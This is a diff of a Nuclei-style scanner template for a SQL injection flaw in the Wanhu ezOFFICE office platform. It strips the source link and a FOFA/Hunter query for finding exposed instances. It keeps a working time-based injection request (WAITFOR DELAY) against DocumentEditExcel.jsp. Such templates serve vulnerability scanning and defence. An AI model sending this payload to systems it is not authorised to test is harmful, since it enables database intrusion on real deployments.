@@ -3,14 +3,8 @@ info:
   name: 万户协同办公平台ezofficeDocumentEditExcel存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/71ac6eab4b7ad5be05d59253e548ddb4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 71ac6eab4b7ad5be05d59253e548ddb4
-    fofa: + hunter`app.name="万户 Ezoffice OA"`
 http:
 - raw:
   - 'GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
